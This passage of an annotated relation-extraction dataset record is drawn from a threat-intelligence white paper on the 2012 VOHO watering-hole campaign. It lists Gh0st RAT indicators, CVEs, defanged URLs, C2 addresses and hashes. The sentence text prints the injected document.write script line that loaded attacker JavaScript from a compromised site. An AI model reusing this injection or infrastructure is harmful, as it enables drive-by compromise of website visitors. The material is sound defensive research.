".", "com/servicesfinance-and-banking)"], ["Services", "for"], ["Healthcare(https://cylance", ".", "com/serviceshealthcare)"], ["Services", "for"], ["Retail(https://cylance", ".", "com/servicesretail)"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "VOHO", "sent_id": 0, "pos": [1]}, {"old_id": "T2", "type": "Time", "name": "July of 2012", "sent_id": 4, "pos": [1, 3]}, {"old_id": "T3", "type": "Organization", "name": "RSA FirstWatchSM", "sent_id": 4, "pos": [6, 7]}, {"old_id": "T4", "type": "Person", "name": "Will Gragido", "sent_id": 14, "pos": []}, {"old_id": "T5", "type": "Campaign", "name": "VOHO", "sent_id": 44, "pos": []}, {"old_id": "T6", "type": "MalwareCharacteristics", "name": "Advanced Persistent Threat", "sent_id": 45, "pos": [8, 10]}, {"old_id": "T7", "type": "Location", "name": "Hong Kong", "sent_id": 48, "pos": []}, {"old_id": "T8", "type": "Malware", "name": "Gh0st RAT", "sent_id": 49, "pos": []}, {"old_id": "T9", "type": "Location", "name": "Washington DC", "sent_id": 51, "pos": [0, 2]}, {"old_id": "T10", "type": "Location", "name": "Boston Massachusetts", "sent_id": 51, "pos": [4, 6]}, {"old_id": "T11", "type": "Campaign", "name": "Aurora", "sent_id": 54, "pos": [3]}, {"old_id": "T12", "type": "Campaign", "name": "Ghostnet", "sent_id": 54, "pos": [6]}, {"old_id": "T13", "type": "MalwareCharacteristics", "name": "Water Holing", "sent_id": 59, "pos": []}, {"old_id": "T14", "type": "Payload", "name": "gh0strat", "sent_id": 68, "pos": []}, {"old_id": "T15", "type": "ExploitTargetObject", "name": "hxxp://wwwxxxxxxxxtrustcom", "sent_id": 76, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxcountymdgov", "sent_id": 78, "pos": []}, {"old_id": "T17", "type": "ExploitTargetObject", "name": "hxxp://ifxxorg", "sent_id": 84, "pos": []}, {"old_id": "T18", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxcenterorg", "sent_id": 86, "pos": []}, {"old_id": "T19", "type": "ExploitTargetObject", "name": "hxxp://xxiorg", "sent_id": 88, "pos": []}, {"old_id": "T20", "type": "ExploitTargetObject", "name": "hxxp://xxxxxxxpriono", "sent_id": 90, "pos": []}, {"old_id": "T21", "type": "ExploitTargetObject", "name": "hxxp:/xxxxxxxxpoliticscom", "sent_id": 92, "pos": []}, {"old_id": "T22", "type": "ExploitTargetObject", "name": "hxxp://wwwrfxxxorg", "sent_id": 94, "pos": []}, {"old_id": "T23", "type": "Organization", "name": "Defense Industrial Base and Educational community", "sent_id": 95, "pos": [5, 10]}, {"old_id": "T24", "type": "ExploitTargetObject", "name": "hxxp://wwwgftxxxorg", "sent_id": 98, "pos": []}, {"old_id": "T25", "type": "ExploitTargetObject", "name": "hxxp://wwwxxxxxxantennascom", "sent_id": 100, "pos": []}, {"old_id": "T26", "type": "ExploitTargetObject", "name": "Defense Industrial Base", "sent_id": 109, "pos": [0, 2]}, {"old_id": "T27", "type": "Exploit", "name": "hxxp://xxxxxxxcurlingcom", "sent_id": 115, "pos": []}, {"old_id": "T28", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 119, "pos": [5]}, {"old_id": "T29", "type": "Vulnerability", "name": "CVE-2012-1723", "sent_id": 121, "pos": [3]}, {"old_id": "T30", "type": "Malware", "name": "Gh0st RAT", "sent_id": 122, "pos": []}, {"old_id": "T31", "type": "Address", "name": "586415559", "sent_id": 125, "pos": []}, {"old_id": "T32", "type": "Address", "name": "586415557", "sent_id": 127, "pos": []}, {"old_id": "T33", "type": "Vulnerability", "name": "CVE-2008-3869", "sent_id": 133, "pos": []}, {"old_id": "T34", "type": "Vulnerability", "name": "CVE-2008-3870", "sent_id": 133, "pos": []}, {"old_id": "T35", "type": "Exploit", "name": "iframejs", "sent_id": 142, "pos": []}, {"old_id": "T36", "type": "Malware", "name": "Gh0st RAT", "sent_id": 144, "pos": [0, 1]}, {"old_id": "T37", "type": "Malware", "name": "gh0st", "sent_id": 147, "pos": [0]}, {"old_id": "T38", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 150, "pos": [5]}, {"old_id": "T39", "type": "Vulnerability", "name": "CVE-2012-1723", "sent_id": 152, "pos": [3]}, {"old_id": "T40", "type": "Time", "name": "June 25th 2012", "sent_id": 154, "pos": [8, 11]}, {"old_id": "T41", "type": "Time", "name": "July 18th 2012", "sent_id": 154, "pos": [13, 11]}, {"old_id": "T42", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 155, "pos": [6]}, {"old_id": "T43", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 157, "pos": [8]}, {"old_id": "T44", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/iframejs", "sent_id": 160, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/modulephp", "sent_id": 161, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/enginejs", "sent_id": 162, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/ifhtm", "sent_id": 163, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/enbluehtm", "sent_id": 164, "pos": []}, {"old_id": "T49", "type": "Indicator", "name": "http://wwwxxxxxxxcurlingcom/Results/cx/magma/bookcab", "sent_id": 165, "pos": []}, {"old_id": "T50", "type": "Vulnerability", "name": "CVE-2007-4848", "sent_id": 178, "pos": []}, {"old_id": "T51", "type": "Exploit", "name": "Enginejs", "sent_id": 177, "pos": []}, {"old_id": "T52", "type": "Organization", "name": "Trend Micro", "sent_id": 180, "pos": [0, 1]}, {"old_id": "T53", "type": "Organization", "name": "McAfee", "sent_id": 182, "pos": [0]}, {"old_id": "T54", "type": "Organization", "name": "Symantec", "sent_id": 184, "pos": [0]}, {"old_id": "T55", "type": "Exploit", "name": "Modulephp", "sent_id": 175, "pos": []}, {"old_id": "T56", "type": "Exploit", "name": "Iframejs", "sent_id": 170, "pos": []}, {"old_id": "T57", "type": "Exploit", "name": "ifhtm", "sent_id": 186, "pos": []}, {"old_id": "T58", "type": "Time", "name": "July of 2011", "sent_id": 189, "pos": [12, 14]}, {"old_id": "T59", "type": "Person", "name": "Mila Parkour", "sent_id": 190, "pos": []}, {"old_id": "T60", "type": "Region", "name": "Asia", "sent_id": 191, "pos": [14]}, {"old_id": "T61", "type": "Exploit", "name": "xKungfoo", "sent_id": 192, "pos": [4]}, {"old_id": "T62", "type": "Exploit", "name": "xKungFoo", "sent_id": 195, "pos": [16]}, {"old_id": "T63", "type": "Software", "name": "Windows XP", "sent_id": 210, "pos": [0, 1]}, {"old_id": "T64", "type": "Software", "name": "Windows 2003", "sent_id": 212, "pos": [0, 1]}, {"old_id": "T65", "type": "Software", "name": "Windows VistaWindows 7", "sent_id": 214, "pos": [0, 2]}, {"old_id": "T66", "type": "Exploit", "name": "Enbluehtm", "sent_id": 233, "pos": []}, {"old_id": "T67", "type": "Vulnerability", "name": "CVE-2012-1889", "sent_id": 233, "pos": [5]}, {"old_id": "T68", "type": "Malware", "name": "gh0st RAT", "sent_id": 234, "pos": [9, 10]}, {"old_id": "T69", "type": "Payload", "name": "Bookcab", "sent_id": 239, "pos": []}, {"old_id": "T70", "type": "Payload", "name": "Bookcab", "sent_id": 240, "pos": []}, {"old_id": "T71", "type": "Malware", "name": "gh0st RAT", "sent_id": 241, "pos": [5, 6]}, {"old_id": "T72", "type": "Malware", "name": "vptrayexe", "sent_id": 241, "pos": []}, {"old_id": "T73", "type": "MD5", "name": "e6b43 c299a9a1f5abd9be2b729e54577", "sent_id": 241, "pos": []}, {"old_id": "T74", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/iframejs", "sent_id": 248, "pos": []}, {"old_id": "T75", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/modulephp", "sent_id": 249, "pos": []}, {"old_id": "T76", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/enginejs", "sent_id": 250, "pos": []}, {"old_id": "T77", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/ifhtm", "sent_id": 251, "pos": []}, {"old_id": "T78", "type": "Indicator", "name": "hxxp://wwwxxxxxxxcurlingcom/Docs/BW06/appletjar", "sent_id": 252, "pos": []}, {"old_id": "T79", "type": "Exploit", "name": "Ifhtm", "sent_id": 255, "pos": []}, {"old_id": "T80", "type": "Obfuscation", "name": "XOR 77", "sent_id": 258, "pos": [9, 10]}, {"old_id": "T81", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 259, "pos": []}, {"old_id": "T82", "type": "Malware", "name": "appletjar", "sent_id": 257, "pos": []}, {"old_id": "T83", "type": "TrojanHorse", "name": "Gh0st RAT", "sent_id": 323, "pos": [0, 1]}, {"old_id": "T84", "type": "ExploitTargetObject", "name": "Dalai Lama", "sent_id": 347, "pos": [2, 3]}, {"old_id": "T85", "type": "Malware", "name": "ZeuS", "sent_id": 355, "pos": [8]}, {"old_id": "T86", "type": "Malware", "name": "VPTrayEXE", "sent_id": 377, "pos": []}, {"old_id": "T87", "type": "MD5", "name": "e6b43c299a9a1f5abd9be2b729e54577", "sent_id": 378, "pos": [0]}, {"old_id": "T88", "type": "Malware", "name": "UPBAK", "sent_id": 409, "pos": []}, {"old_id": "T89", "type": "Address", "name": "13425524247", "sent_id": 430, "pos": []}, {"old_id": "T90", "type": "Malware", "name": "VPTrayEXE", "sent_id": 429, "pos": []}, {"old_id": "T91", "type": "MD5", "name": "acc583fc596d38626d37cbf6de8a01cb", "sent_id": 455, "pos": [0]}, {"old_id": "T92", "type": "Malware", "name": "VPTrayEXE", "sent_id": 456, "pos": []}, {"old_id": "T93", "type": "MD5", "name": "b894efe4173f90479fddff455daf6ff3", "sent_id": 457, "pos": [0]}, {"old_id": "T95", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 490, "pos": []}, {"old_id": "T96", "type": "Malware", "name": "VPTrayEXE", "sent_id": 489, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "SvohostEXE", "sent_id": 506, "pos": []}, {"old_id": "T98", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 507, "pos": [0]}, {"old_id": "T94", "type": "Malware", "name": "SVOHOSTEXE", "sent_id": 513, "pos": []}, {"old_id": "T99", "type": "Obfuscation", "name": "HEX digits", "sent_id": 526, "pos": [5, 6]}, {"old_id": "T100", "type": "Address", "name": "586415559", "sent_id": 546, "pos": []}, {"old_id": "T101", "type": "Malware", "name": "SVOHOSTEXE", "sent_id": 547, "pos": []}, {"old_id": "T102", "type": "Campaign", "name": "VOHO", "sent_id": 568, "pos": [0]}, {"old_id": "T103", "type": "Time", "name": "June 25 2012", "sent_id": 575, "pos": [6, 9]}, {"old_id": "T104", "type": "Software", "name": "Internet Explorer", "sent_id": 576, "pos": [7, 8]}, {"old_id": "T105", "type": "Time", "name": "July 9 2012", "sent_id": 576, "pos": [11, 14]}, {"old_id": "T106", "type": "Time", "name": "July 10th", "sent_id": 581, "pos": [7, 8]}, {"old_id": "T107", "type": "ExploitTargetObject", "name": "Sun Java", "sent_id": 583, "pos": [12, 13]}, {"old_id": "T108", "type": "Time", "name": "July 16 2012", "sent_id": 583, "pos": []}, {"old_id": "T109", "type": "Time", "name": "July 18 2012", "sent_id": 586, "pos": [5, 8]}, {"old_id": "T110", "type": "MD5", "name": "03db29c71b0031af08081f5e2f7dcdf2", "sent_id": 702, "pos": [0]}, {"old_id": "T111", "type": "MD5", "name": "644161889f0f60885b2a0eec12038b66", "sent_id": 703, "pos": [0]}, {"old_id": "T112", "type": "Address", "name": "5864143245", "sent_id": 705, "pos": []}, {"old_id": "T113", "type": "Indicator", "name": "Wsdhealthycom", "sent_id": 698, "pos": []}, {"old_id": "T114", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 707, "pos": []}, {"old_id": "T115", "type": "Indicator", "name": "usa-mailscieroncom", "sent_id": 708, "pos": []}, {"old_id": "T116", "type": "Indicator", "name": "dllfreshdnsorg", "sent_id": 709, "pos": []}, {"old_id": "T117", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applet19html", "sent_id": 714, "pos": []}, {"old_id": "T118", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applet19exe", "sent_id": 715, "pos": []}, {"old_id": "T119", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Applethtml", "sent_id": 716, "pos": []}, {"old_id": "T120", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Appletjar", "sent_id": 717, "pos": []}, {"old_id": "T121", "type": "Exploit", "name": "wwwwsdhealthycom/userfiles/file/Appletexe", "sent_id": 718, "pos": []}, {"old_id": "T122", "type": "Vulnerability", "name": "CVE\u20132011-3544", "sent_id": 721, "pos": [0]}, {"old_id": "T123", "type": "Address", "name": "586415559", "sent_id": 729, "pos": []}, {"old_id": "T124", "type": "Address", "name": "586415557", "sent_id": 730, "pos": []}, {"old_id": "T125", "type": "Address", "name": "5864143245", "sent_id": 731, "pos": []}, {"old_id": "T126", "type": "Malware", "name": "gh0st RAT", "sent_id": 729, "pos": []}, {"old_id": "T127", "type": "Indicator", "name": "wsdhealthycom", "sent_id": 733, "pos": []}, {"old_id": "T128", "type": "Indicator", "name": "*******curlingcom", "sent_id": 734, "pos": []}, {"old_id": "T129", "type": "Indicator", "name": "usc-datasurootcom", "sent_id": 735, "pos": []}, {"old_id": "T130", "type": "Indicator", "name": "usa-mailscieroncom", "sent_id": 736, "pos": []}, {"old_id": "T131", "type": "Indicator", "name": "dllfreshdnsorg", "sent_id": 737, "pos": []}, {"old_id": "T132", "type": "Malware", "name": "gh0st RAT", "sent_id": 735, "pos": []}, {"old_id": "T133", "type": "Malware", "name": "gh0st RAT", "sent_id": 736, "pos": []}, {"old_id": "T134", "type": "Malware", "name": "gh0st RAT", "sent_id": 737, "pos": []}, {"old_id": "T135", "type": "MD5", "name": "03db29c71b0031af08081f5e2f7dcdf2", "sent_id": 746, "pos": [0]}, {"old_id": "T136", "type": "MD5", "name": "644161889f0f60885b2a0eec12038b66", "sent_id": 747, "pos": [0]}, {"old_id": "T137", "type": "MD5", "name": "e6b43c299a9a1f5abd9be2b729e54577", "sent_id": 748, "pos": [0]}, {"old_id": "T138", "type": "MD5", "name": "2fe340fe2574ae540bd98bd9af8ec67d", "sent_id": 749, "pos": [0]}, {"old_id": "T139", "type": "Address", "name": "586415559", "sent_id": 751, "pos": []}, {"old_id": "T140", "type": "Address", "name": "586415557", "sent_id": 751, "pos": []}, {"old_id": "T141", "type": "Address", "name": "5864143245", "sent_id": 751, "pos": []}, {"old_id": "T142", "type": "Address", "name": "642617474", "sent_id": 751, "pos": []}, {"old_id": "T143", "type": "Malware", "name": "gh0st RAT", "sent_id": 740, "pos": [2, 3]}, {"old_id": "T144", "type": "Malware", "name": "Gh0st RAT", "sent_id": 754, "pos": [1, 2]}, {"old_id": "T145", "type": "Exploit", "name": "xKungFoo", "sent_id": 768, "pos": []}], "labels": [{"old_id": "R1", "r": "P32", "h": 4, "t": 6, "evidence": [44, 45, 46, 47, 48]}, {"old_id": "R2", "r": "P7", "h": 26, "t": 27, "evidence": [115, 116, 117, 118, 119]}, {"old_id": "R3", "r": "P7", "h": 26, "t": 28, "evidence": [115, 116, 117, 118, 119, 120, 121]}, {"old_id": "R4", "r": "P21", "h": 30, "t": 29, "evidence": []}, {"old_id": "R5", "r": "P21", "h": 31, "t": 29, "evidence": []}, {"old_id": "R6", "r": "P7", "h": 36, "t": 37, "evidence": [147, 148, 149, 150]}, {"old_id": "R7", "r": "P7", "h": 36, "t": 38, "evidence": [147, 148, 149, 150, 151, 152]}, {"old_id": "R8", "r": "P7", "h": 50, "t": 49, "evidence": [177, 178]}, {"old_id": "R9", "r": "P33", "h": 50, "t": 57, "evidence": [177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189]}, {"old_id": "R10", "r": "P7", "h": 65, "t": 66, "evidence": [233]}, {"old_id": "R11", "r": "P21", "h": 72, "t": 71, "evidence": [241]}, {"old_id": "R12", "r": "P21", "h": 80, "t": 81, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 88, "t": 89, "evidence": []}, {"old_id": "R15", "r": "P21", "h": 93, "t": 94, "evidence": []}, {"old_id": "R14", "r": "P21", "h": 96, "t": 95, "evidence": []}, {"old_id": "R16", "r": "P21", "h": 92, "t": 91, "evidence": []}, {"old_id": "R17", "r": "P21", "h": 90, "t": 91, "evidence": [455, 456]}, {"old_id": "R18", "r": "P21", "h": 86, "t": 85, "evidence": []}, {"old_id": "R19", "r": "P21", "h": 99, "t": 100, "evidence": [546, 547]}, {"old_id": "R20", "r": "P33", "h": 101, "t": 102, "evidence": [568, 569, 570, 571, 572, 573, 574, 575]}, {"old_id": "R21", "r": "P33", "h": 101, "t": 104, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576]}, {"old_id": "R22", "r": "P33", "h": 101, "t": 105, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581]}, {"old_id": "R23", "r": "P33", "h": 101, "t": 107, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583]}, {"old_id": "R24", "r": "P33", "h": 101, "t": 108, "evidence": [568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586]}, {"old_id": "R25", "r": "P21", "h": 122, "t": 125, "evidence": [729]}, {"old_id": "R26", "r": "P21", "h": 123, "t": 125, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 124, "t": 125, "evidence": []}, {"old_id": "R28", "r": "P21", "h": 126, "t": 131, "evidence": [733, 734, 735]}, {"old_id": "R29", "r": "P21", "h": 127, "t": 131, "evidence": [734, 735]}, {"old_id": "R30", "r": "P21", "h": 128, "t": 131, "evidence": [735]}, {"old_id": "R31", "r": "P21", "h": 129, "t": 132, "evidence": [736]}, {"old_id": "R32", "r": "P21", "h": 130, "t": 133, "evidence": [737]}, {"old_id": "R33", "r": "P21", "h": 134, "t": 142, "evidence": []}, {"old_id": "R34", "r": "P21", "h": 135, "t": 142, "evidence": []}, {"old_id": "R35", "r": "P21", "h": 136, "t": 142, "evidence": []}, {"old_id": "R36", "r": "P21", "h": 137, "t": 142, "evidence": []}, {"old_id": "R37", "r": "P21", "h": 138, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R38", "r": "P21", "h": 139, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R39", "r": "P21", "h": 140, "t": 143, "evidence": [751, 752, 753, 754]}, {"old_id": "R40", "r": "P21", "h": 141, "t": 143, "evidence": [751, 752, 753, 754]}], "title": ["inputs/txt/201209RSAFirstWatchVOHO"], "sents": [["THE", "VOHO", "CAMPAIGN:", "AN", "IN", "DEPTH"], ["ANALYSIS"], ["RSA", "FirstWatchSM", "Intelligence", "Report"], ["White", "Paper"], ["In", "July", "of", "2012", ",", "the", "RSA", "FirstWatchSM", "research", "and", "intelligence", "team", "identified", "an"], ["emerging", "malicious", "code", "and", "content", "campaign", "spreading", "at", "a", "rapid", "rate", "within", "very"], ["About", "RSA", "FirstWatchS", "M", "Team"], ["specific", "geographic", "theaters", ".", "These", "clusters", "were", "confined", "to", "ten", "geographic", "areas"], ["RSA", "FirstWatchSM", "team", "is", "an", "elite", ",", "highly"], ["trained", "global", "threat", "research", "and"], ["intelligence", "team", "designed", "to", "operate", "in"], ["a", "number", "of", "disciplines", "to", "provide"], ["tactical", "and", "strategic", "intelligence", "on"], ["advanced", "threats", ",", "threat", "campaigns", "and"], ["threat", "actors", ".", "The", "team", ",", "lead", "by", "Will"], ["Gragido", ",", "focuses", "on", "advanced", "threat"], ["research", "and", "intelligence", "which"], ["culminates", "in", "threat", "feeds", ",", "digests", ","], ["profiles", "and", "ecosystem", "analysis"], ["designed", "to", "aid", "the", "RSA", "NetWitness\u00ae"], ["user", "community", "and", "the", "information"], ["security", "community", "at", "large", "in"], ["contending", "with", "these", "challenges", "."], ["and", "involved", "thousands", "of", "hosts", ".", "To", "the", "untrained", "eye", "it", "would", "appear", "the", "hosts"], ["Contributing", "Authors"], ["Alex", "Cox", ",", "Principal", "Researcher", ",", "RSA"], ["FirstWatch", "Team"], ["Chris", "Elisan", ",", "Principal", "Malware"], ["Researcher", ",", "RSA", "FirstWatch", "Team"], ["Will", "Gragido", ",", "Sr", ".", "Manager,", "RSA"], ["FirstWatch", "Team"], ["Chris", "Harrington", ",", "Consulting", "Security"], ["Engineer", ",", "EMC", "CIRC"], ["Jon", "McNeill", ",", "Principal", "Technologist", ",", "RSA"], ["FirstWatch", "Team"], ["involved", "in", "this", "campaign", "were", "compromised", "as", "the", "result", "of", "innocent", "web", "surfing"], ["using", "a", "common", "\u201cdrive-by\u201d", "attack", "mechanism", ".", "While", "at", "face", "value", "this", "is", "true", ",", "our"], ["investigation", "infers", "that", "the", "populations", "compromised", "were", "not", "chosen", "in", "an"], ["indiscriminate", "manner", ",", "but", "rather", "with", "great", "forethought", ".", "Based", "on", "the", "RSA"], ["FirstWatch", "research", ",", "we", "believe", "these", "websites", "were", "likely", "chosen", "with", "exact"], ["precision", "and", "great", "consideration;", "selected", "from", "thousands", "upon", "thousands", "of"], ["websites", "due", "to", "familiarity", "and", "proximity", "to", "the", "targets", "of", "interest", "that", "the", "threat"], ["actors", "responsible", "for", "the", "campaign", "were", "truly", "interested", "in", "compromising", "."], ["The", "RSA-FirstWatch", "team\u2019s", "research", "led", "to", "the", "identification", "of", "this", "campaign", "and", "its"], ["name", ",", "\u2018VOHO\u2019", ".", "From", "a", "tools", ",", "technique", "and", "procedure", "(TTP)", "perspective", ",", "the", "RSA"], ["FirstWatch", "team", "believes", "this", "campaign", "aligns", "with", "the", "Advanced", "Persistent", "Threat"], ["(APT)", "threat", "model", ",", "including", "communications", "emitting", "from", "compromised", "hosts", "to"], ["IP", "addresses", "confirmed", "as", "Command", "and", "Control", "(C2)", "servers", "(in", "this", "case", ",", "located"], ["in", "Hong", "Kong);", "code", "re-use", "using", "exploit", "scripts", "and", "ultimately", ",", "a", "before-unseen"], ["variant", "of", "\u201cGh0st", "RAT\u201d", "malware", ".", "Additionally", ",", "targets", "appeared", "to", "be", "specifically"], ["chosen", "to", "compromise", "hosts", "involved", "in", "business", "and", "local", "governments", "in"], ["Washington", ",", "DC", "and", "Boston", ",", "Massachusetts", ",", "as", "well", "as", "organizations", "involved", "the"], ["development", "and", "promotion", "of", "democratic", "process", "in", "non-permissive", "regions", ".", "As", "a"], ["whole", ",", "these", "specific", "TTPs", "have", "been", "observed", "in", "previous", "APT", "attack", "campaigns", ","], ["most", "notably", ",", "Aurora", "i", "and", "Ghostnet", "ii", "."], ["Through", "our", "research", ",", "the", "RSA", "FirstWatch", "team", "identified", "what", "it", "believes", "to", "be", "the"], ["primary", "mechanism", "for", "tactical", "and", "strategic", "infection", "of", "victims", "affiliated", "with"], ["targets", "of", "opportunity", ".", "While", "this", "attack", "methodology", "has", "been", "observed", "before", ",", "it"], ["has", "not", "been", "widely", "documented", "or", "disseminated", ".", "As", "such", ",", "we", "have", "termed", "this"], ["technique", "\u2018Water", "Holing\u2019", "."], ["The", "architects", "of", "these", "campaigns", "survey", "and", "select", "the", "websites", "(known", "as", "pivot", "or"], ["redirector", "sites)", "leveraged", "in", "these", "attacks", "carefully", ".", "Weighing", "their", "geographic"], ["relevance", ",", "proximity", "to", "their", "desired", "targets", "of", "opportunity", ",", "and", "likelihood", "of", "being"], ["traversed", "by", "potential", "victim-users", "associated", "with", "the", "attacker", "objective", ",", "the"], ["adversary", "carefully", "exploits", "vulnerable", "systems", "and", "inserts", "malicious", "scripts", "to"], ["deliver", "a", "Trojan", "payload", "via", "browser-based", "exploits", "to", "visitors", "to", "the", "website", "."], ["Throughout", "this", "paper", ",", "we", "will", "examine", "the", "evolution", "of", "this", "threat", "campaign", ",", "its", "ties"], ["to", "other", "comparable", "threat", "campaigns", "where", "variants", "of", "the", "malicious", "payload", "seen"], ["in", "this", "attack", "(gh0strat)", "have", "been", "identified", "and", "chronicled", ",", "epicenters", "of"], ["geographic", "activity", "associated", "with", "this", "campaign", ",", "industry/verticals", "targeted", "in", "this"], ["campaign", "and", "the", "construction", "of", "the", "attribution", "chain", "."], ["2"], ["Specifics"], ["Using", "the", "tactic", "of", "crafting", "a", "\u201cWatering", "Hole\u201d", ",", "the", "majority", "of", "the", "redirection", "activity", "occurred"], ["because", "of", "JavaScript", "elements", "on", "two", "specific", "websites", "."], ["\u2022"], ["hxxp://www", ".", "xxxxxxxxtrust.com"], ["\u2022"], ["hxxp://xxxxxxcountymd", ".", "gov"], ["Respectively", ",", "these", "two", "sites", "\u2013", "one", "a", "regional", "bank", "in", "Massachusetts", "and", "a", "local", "government"], ["serving", "the", "Washington", "DC", "suburbs", "."], ["We", "also", "saw", "an", "additional", "chain", "of", "websites", "with", "a", "geopolitical", "central", "theme", "redirecting", "to", "the"], ["exploit", "site:"], ["\u2022"], ["hxxp://ifxx", ".", "org"], ["\u2022"], ["hxxp://xxxxxxcenter", ".", "org"], ["\u2022"], ["hxxp://xxi", ".", "org"], ["\u2022"], ["hxxp://xxxxxxx", ".", "prio.no"], ["\u2022"], ["hxxp:/xxxxxxxxpolitics", ".", "com"], ["\u2022"], ["hxxp://www", ".", "rfxxx.org"], ["Additionally", ",", "sites", "serving", "the", "Defense", "Industrial", "Base", "and", "Educational", "community", "were", "also"], ["observed", "redirecting", "to", "the", "exploit", "site:"], ["\u2022"], ["hxxp://www", ".", "gftxxx.org"], ["\u2022"], ["hxxp://www", ".", "xxxxxxantennas.com"], ["When", "taken", "as", "a", "whole", ",", "this", "campaign", "appears", "to", "have", "targeted:"], ["\u2022"], ["Boston", ",", "Massachusetts", "area", "users"], ["\u2022"], ["Political", "Activists"], ["\u2022"], ["Users", "Washington", ",", "DC", "and", "its", "suburbs"], ["\u2022"], ["Defense", "Industrial", "Base"], ["\u2022"], ["Education"], ["Malicious", "Infrastructure"], ["Hosts", "visiting", "the", "aforementioned", "sites", "were", "redirected", "to", "a", "website", "of", "enthusiasts", "of", "a", "lesser"], ["known", "sport", "at", "the", "following", "domain:"], ["hxxp://xxxxxxxcurling", ".", "com"], ["This", "site", "attempted", "to", "exploit", "the", "following", "host", "vulnerabilities", ",", "in", "two", "different", "attack"], ["campaigns:"], ["\u2022"], ["Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012-1889"], ["\u2022"], ["Java", "Exploit", "\u2013", "CVE-2012-1723"], ["Once", "successfully", "exploited", ",", "the", "installed", "\u201cGh0st", "RAT\u201d", "would", "beacon", "to", "one", "of", "two", "IP"], ["addresses:"], ["\u2022"], ["58", ".", "64.155.59"], ["\u2022"], ["58", ".", "64.155.57"], ["3"], ["Exploit", "Specifics"], ["Attack", "Methodology", "Overview"], ["hxxp://xxxxxxxcurling", ".", "com", "Compromise"], ["Files", "found", "on", "the", "sporting", "group", "website", "indicate", "that", "this", "server", "was", "likely", "compromised", "with"], ["a", "remote", "buffer", "overflow", "(CVE-2008-3869/CVE-2008-3870)", "against", "the", "server\u2019s", "sadmind"], ["daemon", ".", "Additional", "files", "indicated", "the", "ability", "to", "establish", "a", "remote", "shell", "on", "demand", "."], ["It", "is", "unknown", "if", "this", "method", "was", "also", "used", "to", "compromise", "the", "\u201cwatering", "hole\u201d", "sites", ".", "In", "these"], ["cases", ",", "the", "following", "code", "snipped", "was", "added", "to", "publically", "accessible", "pages", "on", "the", "site", ","], ["typically", "", ".", "js", "files", "are", "used", "to", "process", "a", "site\u2019s", "JavaScript:"], ["document", ".", "write('<script"], ["src=\"http://www", ".", "*******curling.com/Docs/BW06/iframe.js\"></script>');"], ["This", "is", "a", "simple", "redirection", "mechanism", "that", "will", "cause", "the", "browser", "to", "redirect", "and", "load", "content"], ["from", "the", "remote", "site", "."], ["Hits", "to", "\u201ciframe", ".", "js\u201d", "launch", "an", "enumeration", "and", "exploit", "chain", "that"], ["attempts", "to", "exploit", "two", "different", "vulnerabilities", ","], ["Gh0st", "RAT", "is", "a", "multiple-purpose", "remote", "access", "tool", "that", "allows", "extensive", "remote", "control", "of"], ["compromised", "hosts", "."], ["While", "there", "is", "no", "known", "evidence", "linking", "this", "attack", "to", "previous", "attacks", ","], ["gh0st", "has", "historically", "been", "used", "in", "politically", "motivated", "espionage", "by", "nation-state", "attackers", ",", "in"], ["a", "similar", "manner", "as", "seen", "in", "this", "campaign", "depending", "on", "the", "specific", "redirection", "path:"], ["\u2022"], ["Microsoft", "XML", "Core", "Services", "\u2013", "CVE-2012-1889"], ["\u2022"], ["Java", "Exploit", "\u2013", "CVE-2012-1723"], ["Phase", "1", "-", "Exploit", "Chain", "\u2013", "Microsoft", "XML", "Core", "Services"], ["From", "our", "research", ",", "this", "campaign", "occurred", "between", "June", "25th", ",", "2012", "and", "July", "18th", "2012", "in"], ["which", "attackers", "sought", "to", "exploit", "the", "CVE-2012-1889", "vulnerability", "that", "was", "zero-day", "and", "was"], ["being", "used", "in", "targeted", "attacks", "as", "noted", "in", "early", "June", "iii", "."], ["In", "this", "attack", ",", "a", "successful", "exploit", "on", "CVE-2012-1889", "followed", "the", "following", "path:"], ["[Watering", "Hole", "Sites]"], ["http://xxxxxxcountymd", ".", "gov", "(or", "other", "water", "hole", "site)", "\uf0e0"], ["http://www", ".", 